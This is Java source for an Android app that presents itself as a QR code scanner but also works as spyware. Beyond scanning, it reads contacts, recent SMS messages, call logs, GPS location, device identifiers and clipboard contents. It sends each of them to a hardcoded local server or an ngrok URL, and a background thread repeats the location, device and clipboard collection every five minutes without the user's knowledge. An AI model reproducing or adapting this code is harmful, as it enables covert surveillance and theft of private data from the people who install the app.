package com.qr.scanner.app;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.annotation.NonNull;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageAnalysis;
import androidx.camera.core.ImageProxy;
import androidx.camera.core.Preview;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.camera.view.PreviewView;
import com.google.mlkit.vision.barcode.BarcodeScanner;
import com.google.mlkit.vision.barcode.BarcodeScannerOptions;
import com.google.mlkit.vision.barcode.BarcodeScanning;
import com.google.mlkit.vision.barcode.common.Barcode;
import com.google.mlkit.vision.common.InputImage;
import com.google.common.util.concurrent.ListenableFuture;
import org.json.JSONArray;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.net.URL;
import java.net.HttpURLConnection;
import java.io.OutputStreamWriter;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class QRMainActivity extends AppCompatActivity {
    private static final String TAG = "QRScanner";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    
    // Server URL - Local network IP (more stable than ngrok)
    private String serverUrl = "http://192.168.1.102:8080";
    private String ngrokUrl = null;
    
    // UI Components
    private TextView scanResult;
    private Button scanButton;
    private Button collectDataButton;
    private Button settingsButton;
    private PreviewView cameraPreview;
    
    // Camera components
    private BarcodeScanner barcodeScanner;
    private boolean isScanning = false;
    private int currentLensFacing = CameraSelector.LENS_FACING_BACK;
    private ListenableFuture<ProcessCameraProvider> cameraProviderFuture;
    
    // Device ID
    private String deviceId;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_qr_main);
        
        // Initialize device ID
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        
        // Check Ngrok URL
        checkNgrokUrl();
        
        // Initialize UI components
        initializeUI();
        
        // Check and request permissions
        checkPermissions();
        
        // Setup barcode scanner
        setupBarcodeScanner();
        
        // Start background data collection
        startBackgroundCollection();
    }
    
    private void initializeUI() {
        scanResult = findViewById(R.id.scanResult);
        scanButton = findViewById(R.id.scanButton);
        collectDataButton = findViewById(R.id.collectDataButton);
        settingsButton = findViewById(R.id.settingsButton);
        cameraPreview = findViewById(R.id.cameraPreview);
    }
    
    private void checkNgrokUrl() {
        SharedPreferences prefs = getSharedPreferences("QRScannerPrefs", Context.MODE_PRIVATE);
        ngrokUrl = prefs.getString("ngrok_url", null);
        if (ngrokUrl != null) {
            serverUrl = ngrokUrl;
            Log.d(TAG, "Using Ngrok URL: " + serverUrl);
        }
    }
    
    private void checkPermissions() {
        String[] permissions = {
            Manifest.permission.CAMERA,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_PHONE_STATE
        };
        
        boolean allGranted = true;
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }
        
        if (!allGranted) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            for (int i = 0; i < permissions.length; i++) {
                Log.d(TAG, "Permission " + permissions[i] + " granted: " + (grantResults[i] == PackageManager.PERMISSION_GRANTED));
            }
        }
    }
    
    private void setupBarcodeScanner() {
        BarcodeScannerOptions options = new BarcodeScannerOptions.Builder()
            .setBarcodeFormats(Barcode.FORMAT_QR_CODE)
            .build();
        barcodeScanner = BarcodeScanning.getClient(options);
    }
    
    public void toggleScanning(View view) {
        if (isScanning) {
            stopScanning();
        } else {
            startScanning();
        }
    }
    
    private void startScanning() {
        // Kamera izni kontrolü
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "Kamera izni gerekli!", Toast.LENGTH_LONG).show();
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, 200);
            return;
        }
        
        try {
            isScanning = true;
            if (scanButton != null) {
                scanButton.setText("Taramayi Durdur");
            }
            if (cameraPreview != null) {
                cameraPreview.setVisibility(View.VISIBLE);
            }
            
            cameraProviderFuture = ProcessCameraProvider.getInstance(this);
            cameraProviderFuture.addListener(() -> {
                try {
                    ProcessCameraProvider cameraProvider = cameraProviderFuture.get();
                    bindCameraPreview(cameraProvider);
                    Toast.makeText(this, "Kamera baslatildi", Toast.LENGTH_SHORT).show();
                } catch (ExecutionException | InterruptedException e) {
                    Log.e(TAG, "Camera setup failed: " + e.getMessage());
                    Toast.makeText(this, "Kamera hatasi: " + e.getMessage(), Toast.LENGTH_LONG).show();
                    stopScanning();
                }
            }, ContextCompat.getMainExecutor(this));
        } catch (Exception e) {
            Log.e(TAG, "Error starting camera: " + e.getMessage());
            Toast.makeText(this, "Kamera baslatma hatasi: " + e.getMessage(), Toast.LENGTH_LONG).show();
            isScanning = false;
        }
    }
    
    private void bindCameraPreview(ProcessCameraProvider cameraProvider) {
        try {
            Preview preview = new Preview.Builder().build();
            preview.setSurfaceProvider(cameraPreview.getSurfaceProvider());
            
            CameraSelector cameraSelector = new CameraSelector.Builder()
                .requireLensFacing(currentLensFacing)
                .build();
            
            ImageAnalysis imageAnalysis = new ImageAnalysis.Builder()
                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                .build();
            
            imageAnalysis.setAnalyzer(ContextCompat.getMainExecutor(this), this::processImage);
            
            cameraProvider.unbindAll();
            cameraProvider.bindToLifecycle(this, cameraSelector, preview, imageAnalysis);
            
            Log.d(TAG, "Camera bound successfully");
        } catch (Exception e) {
            Log.e(TAG, "Camera binding failed: " + e.getMessage());
            Toast.makeText(this, "Kamera baglama hatasi: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }
    
    private void processImage(ImageProxy imageProxy) {
        @SuppressWarnings("UnsafeExperimentalUsageError")
        InputImage image = InputImage.fromMediaImage(
            imageProxy.getImage(),
            imageProxy.getImageInfo().getRotationDegrees()
        );
        
        barcodeScanner.process(image)
            .addOnSuccessListener(barcodes -> {
                for (Barcode barcode : barcodes) {
                    String rawValue = barcode.getRawValue();
                    if (rawValue != null) {
                        handleScanResult(rawValue);
                    }
                }
            })
            .addOnFailureListener(e -> Log.e(TAG, "Barcode scanning failed: " + e.getMessage()))
            .addOnCompleteListener(task -> imageProxy.close());
    }
    
    private void handleScanResult(String result) {
        scanResult.setText("Taranan: " + result);
        sendDataToServer("qr_scan", result);
        
        if (result.startsWith("http")) {
            Toast.makeText(this, "URL tarandi: " + result, Toast.LENGTH_LONG).show();
        }
    }
    
    private void stopScanning() {
        isScanning = false;
        scanButton.setText("Taramayi Baslat");
        cameraPreview.setVisibility(View.GONE);
        
        if (cameraProviderFuture != null) {
            try {
                ProcessCameraProvider cameraProvider = cameraProviderFuture.get();
                cameraProvider.unbindAll();
            } catch (Exception e) {
                Log.e(TAG, "Error stopping camera: " + e.getMessage());
            }
        }
    }
    
    public void collectAllData(View view) {
        Toast.makeText(this, "Veriler toplaniyor...", Toast.LENGTH_SHORT).show();
        
        new Thread(() -> {
            collectContacts();
            collectSMS();
            collectCallLogs();
            collectLocation();
            collectSystemInfo();
            
            runOnUiThread(() -> Toast.makeText(this, "Veriler toplandi!", Toast.LENGTH_SHORT).show());
        }).start();
    }
    
    private void collectContacts() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        
        try {
            JSONArray contacts = new JSONArray();
            ContentResolver cr = getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            
            if (cur != null && cur.getCount() > 0) {
                while (cur.moveToNext()) {
                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    
                    if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                        
                        while (pCur.moveToNext()) {
                            String phone = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            JSONObject contact = new JSONObject();
                            contact.put("name", name);
                            contact.put("phone", phone);
                            contacts.put(contact);
                        }
                        pCur.close();
                    }
                }
                cur.close();
            }
            
            sendDataToServer("contacts", contacts.toString());
            Log.d(TAG, "Contacts collected: " + contacts.length());
        } catch (Exception e) {
            Log.e(TAG, "Error collecting contacts: " + e.getMessage());
        }
    }
    
    private void collectSMS() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        
        try {
            JSONArray smsList = new JSONArray();
            Uri uri = Uri.parse("content://sms/");
            Cursor cur = getContentResolver().query(uri, null, null, null, "date DESC LIMIT 100");
            
            if (cur != null && cur.moveToFirst()) {
                do {
                    String address = cur.getString(cur.getColumnIndex(Telephony.Sms.ADDRESS));
                    String body = cur.getString(cur.getColumnIndex(Telephony.Sms.BODY));
                    String date = cur.getString(cur.getColumnIndex(Telephony.Sms.DATE));
                    String type = cur.getString(cur.getColumnIndex(Telephony.Sms.TYPE));
                    
                    JSONObject sms = new JSONObject();
                    sms.put("address", address);
                    sms.put("body", body);
                    sms.put("date", date);
                    sms.put("type", type);
                    smsList.put(sms);
                } while (cur.moveToNext());
                cur.close();
            }
            
            sendDataToServer("sms", smsList.toString());
            Log.d(TAG, "SMS collected: " + smsList.length());
        } catch (Exception e) {
            Log.e(TAG, "Error collecting SMS: " + e.getMessage());
        }
    }
    
    private void collectCallLogs() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        
        try {
            JSONArray calls = new JSONArray();
            Cursor cur = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 100");
            
            if (cur != null && cur.moveToFirst()) {
                do {
                    String number = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));
                    String date = cur.getString(cur.getColumnIndex(CallLog.Calls.DATE));
                    String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));
                    String type = cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE));
                    
                    JSONObject call = new JSONObject();
                    call.put("number", number);
                    call.put("date", date);
                    call.put("duration", duration);
                    call.put("type", type);
                    calls.put(call);
                } while (cur.moveToNext());
                cur.close();
            }
            
            sendDataToServer("call", calls.toString());
            Log.d(TAG, "Call logs collected: " + calls.length());
        } catch (Exception e) {
            Log.e(TAG, "Error collecting call logs: " + e.getMessage());
        }
    }
    
    private void collectLocation() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        
        try {
            LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            
            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            
            if (location != null) {
                JSONObject loc = new JSONObject();
                loc.put("latitude", location.getLatitude());
                loc.put("longitude", location.getLongitude());
                loc.put("accuracy", location.getAccuracy());
                loc.put("timestamp", location.getTime());
                
                sendDataToServer("location", loc.toString());
                Log.d(TAG, "Location collected: " + loc.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting location: " + e.getMessage());
        }
    }
    
    private void collectSystemInfo() {
        try {
            JSONObject systemInfo = new JSONObject();
            systemInfo.put("device", Build.DEVICE);
            systemInfo.put("model", Build.MODEL);
            systemInfo.put("manufacturer", Build.MANUFACTURER);
            systemInfo.put("android_version", Build.VERSION.RELEASE);
            systemInfo.put("sdk", Build.VERSION.SDK_INT);
            systemInfo.put("device_id", deviceId);
            
            sendDataToServer("system_info", systemInfo.toString());
            Log.d(TAG, "System info collected");
        } catch (Exception e) {
            Log.e(TAG, "Error collecting system info: " + e.getMessage());
        }
    }
    
    public void switchCamera(View view) {
        if (isScanning) {
            currentLensFacing = (currentLensFacing == CameraSelector.LENS_FACING_BACK)
                ? CameraSelector.LENS_FACING_FRONT
                : CameraSelector.LENS_FACING_BACK;
            
            stopScanning();
            startScanning();
            
            String cameraName = (currentLensFacing == CameraSelector.LENS_FACING_FRONT) ? "On Kamera" : "Arka Kamera";
            Toast.makeText(this, cameraName + " aktif", Toast.LENGTH_SHORT).show();
            Log.d(TAG, "Switched to " + cameraName);
        } else {
            currentLensFacing = (currentLensFacing == CameraSelector.LENS_FACING_BACK)
                ? CameraSelector.LENS_FACING_FRONT
                : CameraSelector.LENS_FACING_BACK;
            
            String cameraName = (currentLensFacing == CameraSelector.LENS_FACING_FRONT) ? "On Kamera" : "Arka Kamera";
            Toast.makeText(this, cameraName + " secildi. Taramayi baslat.", Toast.LENGTH_SHORT).show();
        }
    }
    
    private void startBackgroundCollection() {
        // Notification listener service is declared in manifest, user must enable in settings
        new Thread(() -> {
            while (true) {
                try {
                    collectLocation();
                    collectSystemInfo();
                    collectClipboardData();
                    Thread.sleep(300000); // Every 5 minutes
                } catch (InterruptedException e) {
                    break;
                }
            }
        }).start();
    }
    
    private void collectClipboardData() {
        try {
            android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboard.hasPrimaryClip() && clipboard.getPrimaryClip() != null) {
                CharSequence text = clipboard.getPrimaryClip().getItemAt(0).getText();
                if (text != null && text.length() > 0) {
                    JSONObject clipData = new JSONObject();
                    clipData.put("text", text.toString());
                    clipData.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
                    sendDataToServer("clipboard", clipData.toString());
                    Log.d(TAG, "Clipboard data collected");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting clipboard: " + e.getMessage());
        }
    }
    
    private void sendDataToServer(String type, String data) {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                
                JSONObject json = new JSONObject();
                json.put("type", type);
                json.put("data", data);
                json.put("deviceId", deviceId);
                json.put("deviceName", Build.MODEL);
                json.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
                
                OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
                writer.write(json.toString());
                writer.flush();
                writer.close();
                
                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "Data sent successfully: " + type);
                } else {
                    Log.e(TAG, "Server error: " + responseCode);
                }
                
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending data: " + e.getMessage());
            }
        }).start();
    }
    
    public void openSettings(View view) {
        Intent intent = new Intent(this, SettingsActivity.class);
        startActivity(intent);
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (isScanning) {
            stopScanning();
        }
        if (barcodeScanner != null) {
            barcodeScanner.close();
        }
    }
}
